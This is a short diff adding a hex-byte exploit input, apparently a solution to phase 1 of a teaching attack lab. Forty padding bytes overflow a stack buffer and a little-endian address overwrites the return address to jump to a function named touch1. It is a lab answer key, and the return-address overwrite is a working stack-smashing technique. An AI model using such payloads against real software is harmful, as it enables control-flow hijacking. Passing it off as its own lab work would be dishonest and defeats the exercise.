@@ -1,0 +1,10 @@
+/* Exploit code for part 1 */
+
+/* Pad with 40 bytes to get to return address and then */
+/* replace return address with our own */
+
+41 41 41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41 41 41
+37 19 40 00 00 00 00 00 	/* Little-endian ordered 401937 (touch1 address) */
